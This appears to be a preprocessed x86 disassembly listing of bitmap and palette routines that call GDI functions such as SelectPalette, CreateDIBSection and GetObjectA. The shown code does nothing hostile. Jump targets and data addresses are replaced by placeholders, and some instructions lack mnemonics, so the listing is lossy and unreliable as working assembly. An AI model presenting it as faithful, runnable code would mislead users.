mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
retn
mov eax [ ebp - 0x18 ]
push eax
call DeleteDC
sub_426e44
push ebx
push esi
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0x4 ] 0x1
jle r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax esi
call sub_427084
cmp [ ebx + 0x71 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp eax [ ebx + 0x14 ]
je r-xdata
mov eax [ ebx + 0x10 ]
xor eax eax
jmp r-xdata
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
lea edx [ ebx + 0x18 ]
push edx
mov ecx eax
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_426a90
pop esi
pop ebx
retn
xor eax eax
mov [ ebx + 0x14 ] eax
xor eax eax
mov [ ebx + 0x2c ] eax
push esi
call DeleteObject
test eax eax
jne r-xdata
call sub_422d40
sub_426ec4
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov eax [ ebx + 0x2c ]
pop esi
pop ebx
retn
mov eax ebx
call sub_427084
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_425c60
mov esi eax
mov [ ebx + 0x2c ] esi
mov [ esi + 0x2c ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x10 ]
mov [ esi + 0x28 ] eax
mov [ esi + 0x34 ] ebx
mov [ esi + 0x30 ] sub_426b50
sub_426f0c
push ebx
mov ebx eax
mov eax ebx
call sub_427074
mov eax ebx
call sub_427084
mov edx ebx
mov eax ebx
call sub_426b50
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
pop ebx
retn
sub_426f30
mov eax [ eax + 0x28 ]
mov edx [ eax + 0x8 ]
test edx edx
je r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp edx [ eax + 0x14 ]
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov al 0x1
jmp r-xdata
retn
sub_426fb0
push ebx
mov ebx eax
mov eax [ ebx + 0x34 ]
cmp eax 0x20000000
jne r-xdata
call sub_42154c
mov eax ebx
call sub_426f80
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
dec eax
push eax
mov eax ebx
call sub_426ec4
xor edx edx
pop ecx
call sub_422958
jmp r-xdata
mov eax 0xffffff
jmp r-xdata
or eax 0x2000000
pop ebx
retn
sub_427000
push ebx
push esi
mov ebx [ eax + 0x28 ]
cmp [ ebx + 0x8 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
call sub_427184
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
lea eax [ ebx + 0x18 ]
push eax
push 0x0
mov esi [ ebx + 0x10 ]
mov ecx esi
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_426028
mov [ ebx + 0x14 ] eax
lea eax [ ebx + 0x18 ]
push eax
push 0x54
mov eax [ ebx + 0x8 ]
push eax
call GetObjectA
lea eax [ ebx + 0x18 ]
mov edx eax
add eax 0x18
mov [ eax ] 0x28
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ edx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] 0x1
mov cx [ edx + 0x10 ]
imul cx [ edx + 0x12 ]
mov [ eax + 0xe ] cx
sub_427084
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov esp ebp
pop ebp
retn
mov edx [ eax + 0x14 ]
mov [ eax + 0x8 ] edx
cmp [ eax + 0x6c ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ eax + 0x6c ]
call sub_41a3e0
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x10 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0x14 ]
mov [ ebp - 0xc ] edx
xor eax eax
push ebp
push sub_427107
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x10 ] edx
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov edx [ eax + 0x6c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x14 ] edx
retn
sub_427124
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x32 ] 0x0
je r-xdata
mov esi [ ebx + 0x28 ]
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
cmp [ ebx + 0x31 ] 0x0
jne r-xdata
mov eax ebx
call sub_427074
mov eax ebx
call sub_427084
mov esi [ ebx + 0x28 ]
mov eax ebx
call sub_426fb0
mov ecx eax
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
call sub_4266f0
mov [ esi + 0xc ] eax
mov [ ebx + 0x32 ] 0x1
mov [ ebx + 0x31 ] 0x1
call sub_425be4
mov eax [ esi + 0xc ]
push eax
call DeleteObject
xor eax eax
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_427184
push ebx
push esi
push edi
push ebp
mov edi eax
mov ebp [ edi + 0x28 ]
cmp [ edi + 0x30 ] 0x0
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov eax [ ebp + 0x14 ]
cmp eax [ ebp + 0x8 ]
jne r-xdata
mov cx [ ebp + 0x3e ]
mov eax 0x1
shl eax cl
mov ecx eax
xor edx edx
mov eax [ ebp + 0x14 ]
call sub_4234d8
mov esi eax
mov [ ebp + 0x10 ] esi
test esi esi
jne r-xdata
call sub_425be4
push 0x0
call GetDC
call sub_422de8
mov esi eax
cmp [ ebp + 0x71 ] 0x0
jne r-xdata
mov bl 0x1
push 0xc
push esi
call GetDeviceCaps
mov ebx eax
push 0xe
push esi
call GetDeviceCaps
imul ebx eax
movzx eax [ ebp + 0x2a ]
movzx edx [ ebp + 0x28 ]
imul edx
cmp ebx eax
jl r-xdata
push esi
push 0x0
call ReleaseDC
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push esi
call CreateHalftonePalette
mov [ ebp + 0x10 ] eax
xor ebx ebx
jmp r-xdata
mov [ edi + 0x30 ] 0x1
mov [ ebp + 0x71 ] bl
test bl bl
je r-xdata
sub_42723c
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
mov ebx ecx
mov esi eax
cmp dx 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_422cb0
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x54 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx ebx
mov eax esi
call sub_426a90
mov eax [ esi + 0x28 ]
mov [ eax + 0x70 ] 0x0
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ esi + 0x22 ] al
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
xor eax eax
mov [ ebp - 0x3c ] eax
mov eax esi
call sub_427074
lea eax [ ebp - 0x54 ]
xor ecx ecx
mov edx 0x54
call sub_402b80
lea eax [ ebp - 0x54 ]
push eax
push 0x54
push ebx
call GetObjectA
cmp [ ebp - 0x40 ] 0x0
jne r-xdata
sub_4272c0
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ eax ]
call [ edx ]
push eax
mov eax ebx
call sub_41a3c0
pop ecx
sub ecx eax
mov edx ebx
mov eax esi
call sub_427974
pop esi
pop ebx
retn
sub_4272e4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42736b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ eax + 0x8 ] ebx
mov eax [ ebp - 0x8 ]
mov [ eax + 0x10 ] esi
mov eax [ ebp + 0x10 ]
mov edx [ ebp - 0x8 ]
mov esi eax
lea edi [ edx + 0x18 ]
mov ecx 0x15
[ edi ] [ esi ]
mov eax [ ebp - 0x8 ]
mov dl [ ebp + 0xc ]
mov [ eax + 0x70 ] dl
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x2c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ r-xdata ]
call sub_40331c
mov edx [ ebp - 0x8 ]
mov [ edx + 0x6c ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0x14 ] eax
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_4273cb
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_425e58
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov [ edx + 0x28 ] eax
call sub_425e54
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4273d2
push rw-data
call LeaveCriticalSection
retn
sub_4273e4
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x4
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ esp ]
mov edx esi
mov eax ebx
call sub_427974
pop edx
pop edi
pop esi
pop ebx
retn
sub_42740c
push ebp
mov ebp esp
add esp 0xffffff54
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp - 0x20 ] 0xc
sete [ ebp - 0x21 ]
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
add eax 0xc
add eax 0x400
call sub_4026dc
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x3c ] eax
xor edx edx
push ebp
push sub_427929
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
push ebp
push sub_4278fc
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov [ ebp - 0x20 ] 0x28
mov ecx [ ebp - 0x20 ]
sub ecx 0x4
mov edx [ ebp - 0x18 ]
add edx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
sub esi [ ebp - 0x20 ]
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x10 ]
cmp eax 0x3
je r-xdata
lea edx [ ebp - 0x48 ]
add edx 0x4
mov ecx 0x8
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx [ ebp - 0x3c ]
mov eax ebx
xor ecx ecx
mov edx 0x28
call sub_402b80
mov eax ebx
movzx edx [ ebp - 0x44 ]
mov [ eax + 0x4 ] edx
movzx edx [ ebp - 0x42 ]
mov [ eax + 0x8 ] edx
mov dx [ ebp - 0x40 ]
mov [ eax + 0xc ] dx
mov dx [ ebp - 0x3e ]
mov [ eax + 0xe ] dx
sub esi 0xc
jmp r-xdata
mov ebx [ ebp - 0x3c ]
mov eax [ ebp - 0x20 ]
mov [ ebx ] eax
mov eax [ ebp - 0x18 ]
add eax [ ebp - 0x20 ]
mov [ ebp - 0x1c ] eax
cmp [ ebx + 0xc ] 0x1
je r-xdata
test eax eax
je r-xdata
cmp [ ebp - 0x20 ] 0x28
jne r-xdata
call sub_422cc8
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov [ ebp - 0x38 ] eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
mov ax [ ebx + 0xe ]
cmp ax 0x10
je r-xdata
mov edx [ ebp + 0x8 ]
mov ecx 0xe
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ecx [ ebp - 0x20 ]
sub ecx 0x4
mov edx [ ebp - 0x18 ]
add edx 0x4
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov eax esi
xor edx edx
push edx
push eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x38 ]
call sub_41a65c
mov edx esi
neg edx
mov cx 0x2
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0xaa ]
xor ecx ecx
mov edx 0xe
call sub_402b80
mov [ ebp - 0xaa ] 0x4d42
mov eax [ ebp - 0x20 ]
add eax esi
mov [ ebp - 0xa8 ] eax
lea eax [ ebp - 0xaa ]
mov [ ebp + 0x8 ] eax
mov ecx [ ebx + 0x20 ]
movzx edi [ ebp - 0x21 ]
xor eax eax
mov al [ edi + rw-data ]
imul ecx eax
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_41a5ec
mov eax [ ebx + 0x20 ]
xor edx edx
mov dl [ edi + rw-data ]
imul edx
sub esi eax
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
mov ax [ ebx + 0xe ]
call sub_422f58
mov [ ebx + 0x20 ] eax
cmp [ ebx + 0x10 ] 0x3
jne r-xdata
cmp ax 0x20
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp esi eax
jbe r-xdata
movzx edx [ ebx + 0xe ]
mov eax [ ebx + 0x4 ]
mov ecx 0x20
call sub_422f78
mov ecx eax
mov eax [ ebx + 0x8 ]
cdq
xor eax edx
sub eax edx
imul ecx eax
mov [ ebx + 0x14 ] ecx
mov edx [ ebp - 0x1c ]
mov ecx 0xc
mov eax [ ebp - 0x8 ]
call sub_41a5ec
add [ ebp - 0x1c ] 0xc
sub esi 0xc
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov esi eax
push 0x0
call GetDC
call sub_422de8
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_427877
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x10 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
call sub_423220
cmp [ rw-data ] 0x0
je r-xdata
cmp eax 0x3
jne r-xdata
push 0x0
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call CreateDIBSection
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax esi
call sub_4026dc
mov [ ebp - 0x14 ] eax
xor edx edx
push ebp
push sub_4277df
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0x14 ]
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_41a5ec
mov eax [ ebp - 0xc ]
push eax
call CreateCompatibleDC
call sub_422de8
mov [ ebp - 0x10 ] eax
push 0x1
push 0x1
mov eax [ ebp - 0xc ]
push eax
call CreateCompatibleBitmap
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x20 ]
test eax eax
jbe r-xdata
call GetLastError
test eax eax
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_4277b3
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov edx [ ebp - 0x14 ]
push edx
push 0x4
push eax
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov ecx eax
mov edx [ ebp - 0x1c ]
xor eax eax
call sub_4234d8
mov [ ebp - 0x30 ] eax
push 0x0
mov eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
call sub_40ce50
call sub_422cc8
jmp r-xdata
xor eax eax
push ebp
push sub_427846
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x14 ]
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_41a5ec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4277ba
cmp [ ebp - 0x34 ] 0x0
je r-xdata
call GetLastError
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42787e
mov eax [ ebp - 0xc ]
push eax
push 0x0
call ReleaseDC
retn
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
push eax
call DeleteObject
retn
push 0xffffffff
mov eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
call sub_40ce50
call sub_422cc8
jmp r-xdata
sub_4277ba
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_4026fc
retn
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
sub_42787e
mov eax [ ebp - 0x3c ]
cmp [ eax + 0xe ] 0x8
jbe r-xdata
lea eax [ ebp - 0x9c ]
xor ecx ecx
mov edx 0x54
call sub_402b80
lea eax [ ebp - 0x9c ]
push eax
push 0x54
mov eax [ ebp - 0x28 ]
push eax
call GetObjectA
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x6c ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x68 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x64 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x24 ]
mov [ ebp - 0x60 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_427913
mov eax [ ebp - 0x3c ]
cmp [ eax + 0x20 ] 0x0
jbe r-xdata
cmp [ ebp - 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x3c ]
mov ecx [ eax + 0x20 ]
mov edx [ ebp - 0x1c ]
xor eax eax
call sub_4234d8
mov [ ebp - 0x30 ] eax
sub_427930
lea eax [ ebp - 0x9c ]
push eax
mov al [ ebp - 0x21 ]
push eax
mov eax [ ebp - 0x38 ]
push eax
mov ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_4272e4
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov edx [ ebp - 0x4 ]
mov [ edx + 0x22 ] al
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_427974
push ebx
push esi
push edi
add esp 0xffffff9c
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_427074
test esi esi
jne r-xdata
mov edx esp
mov ecx 0xe
mov eax edi
call sub_41a5ec
cmp [ esp ] 0x4d42
je r-xdata
lea eax [ esp + 0xe ]
xor ecx ecx
mov edx 0x54
call sub_402b80
lea eax [ esp + 0xe ]
push eax
push 0x0
push 0x0
xor ecx ecx
xor edx edx
mov eax ebx
call sub_4272e4
jmp r-xdata
push esp
mov ecx esi
sub ecx 0xe
mov edx edi
mov eax ebx
call sub_42740c
call sub_422cc8
add esp 0x64
pop edi
pop esi
pop ebx
retn
sub_4279e4
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x8 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
call sub_427074
lea eax [ ebp - 0x58 ]
xor ecx ecx
mov edx 0x54
call sub_402b80
test edi edi
je r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
lea eax [ ebp - 0x58 ]
push eax
push 0x54
push edi
call GetObjectA
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ esi + 0x10 ]
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ esi + 0x10 ] eax
jmp r-xdata
call sub_42668c
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
push ebp
push sub_427a7f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x58 ]
push eax
push 0x0
push 0x0
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_4272e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_427aa8
push ebx
push esi
push edi
push ebp
add esp 0xffffffac
mov ebx edx
mov esi eax
mov eax esi
call sub_426f30
cmp bl al
je r-xdata
add esp 0x54
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ esi + 0x28 ]
cmp [ edi + 0x8 ] 0x0
jne r-xdata
test bl bl
jne r-xdata
cmp [ edi + 0x14 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
mov eax [ edi + 0x14 ]
test eax eax
je r-xdata
cmp bl 0x1
jne r-xdata
mov eax esi
call sub_427074
mov eax esi
call sub_427184
push esi
push edi
lea esi [ edi + 0x18 ]
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
mov [ esp + 0x18 ] eax
cmp [ edi + 0x4 ] 0x1
sete bl
test bl bl
je r-xdata
cmp eax [ edi + 0x14 ]
jne r-xdata
mov eax esi
call sub_427074
mov eax esi
call sub_427184
mov eax esi
call sub_427000
cmp [ edi + 0x4 ] 0x1
jne r-xdata
cmp eax [ edi + 0x8 ]
je r-xdata
mov [ edi + 0x30 ] 0x28
jmp r-xdata
xor eax eax
mov [ edi + 0x30 ] eax
jmp r-xdata
mov eax [ edi + 0x10 ]
call sub_42668c
mov ebp eax
mov ebp [ edi + 0x10 ]
jmp r-xdata
lea eax [ edi + 0x18 ]
push eax
mov ecx [ edi + 0x10 ]
mov edx [ edi + 0x14 ]
mov eax esi
call sub_426a90
jmp r-xdata
mov eax [ edi + 0x14 ]
xor edx edx
mov [ edi + 0x14 ] edx
mov ebp [ edi + 0x10 ]
xor edx edx
mov [ edi + 0x10 ] edx
lea edx [ edi + 0x18 ]
push edx
mov dl [ edi + 0x70 ]
push edx
push 0x0
mov ecx ebp
mov edx eax
mov eax esi
call sub_4272e4
jmp r-xdata
push esp
mov dl [ edi + 0x70 ]
push edx
push 0x0
mov ecx ebp
mov edx eax
mov eax esi
call sub_4272e4
mov [ edi + 0x8 ] eax
jmp r-xdata
push esp
push 0x0
mov ecx ebp
mov edx [ edi + 0x10 ]
mov eax [ edi + 0x14 ]
call sub_426028
test bl bl
je r-xdata
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_427be0
push ebx
push esi
push edi
add esp 0xffffffac
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x20 ]
je r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_427084
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
mov [ esp + 0x8 ] edi
mov [ esp + 0x20 ] edi
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax ebx
call sub_426a90
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_427c34
push ebx
push esi
push edi
add esp 0xffffffac
mov ebx edx
mov edi eax
mov esi [ edi + 0x28 ]
lea eax [ esi + 0x30 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ eax + 0xe ] 0x1
je r-xdata
cmp bl al
je r-xdata
mov al 0x1
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_427084
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
mov [ esp + 0x18 ] eax
xor eax eax
mov al bl
mov [ esp + 0x24 ] ax
mov [ esp + 0x26 ] ax
mov [ esp + 0x10 ] ax
mov [ esp + 0x12 ] ax
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax edi
call sub_426a90
mov edx edi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_427cb4
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ ebx + 0x28 ]
cmp edi [ eax + 0x10 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi eax
test edi edi
jne r-xdata
mov eax ebx
call sub_427074
mov eax ebx
call sub_427084
push esi
push edi
add esi 0x18
lea edi [ ebp - 0x58 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
lea eax [ ebp - 0x58 ]
push eax
push 0x0
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
mov ecx edi
call sub_426028
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_427d4b
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x58 ]
push eax
mov al [ esi + 0x70 ]
push eax
push 0x0
mov ecx edi
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4272e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ ebx + 0x28 ]
lea ecx [ eax + 0x18 ]
mov eax [ eax + 0x14 ]
mov edx edi
call sub_425f20
mov [ ebx + 0x22 ] 0x1
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax [ esi + 0x10 ]
call sub_420c7c
xor eax eax
mov [ esi + 0x10 ] eax
jmp r-xdata
sub_427d50
mov eax [ ebp - 0x4 ]
push eax
call DeleteObject
call sub_403920
call sub_403974
mov eax [ ebx + 0x28 ]
lea ecx [ eax + 0x18 ]
mov eax [ eax + 0x14 ]
mov edx edi
call sub_425f20
mov [ ebx + 0x22 ] 0x1
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_427d88
push ebx
push esi
mov esi eax
cmp edx [ esi + 0x34 ]
je r-xdata
pop esi
pop ebx
retn
cmp edx 0x20000000
jne r-xdata
mov [ esi + 0x38 ] 0x1
mov [ esi + 0x38 ] 0x0
jmp r-xdata
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebx eax
mov eax esi
call sub_427084
lea eax [ ebx + 0x18 ]
push eax
mov ecx [ ebx + 0x10 ]
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_426a90
mov [ esi + 0x34 ] edx
mov eax [ esi + 0x28 ]
cmp [ eax + 0x4 ] 0x1
jle r-xdata
sub_427dd8
push ebx
push esi
push edi
add esp 0xffffffac
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x1c ]
je r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_427084
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
mov [ esp + 0x4 ] edi
mov [ esp + 0x1c ] edi
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax ebx
call sub_426a90
mov edx ebx
mov eax ebx
mov ecx [ eax ]
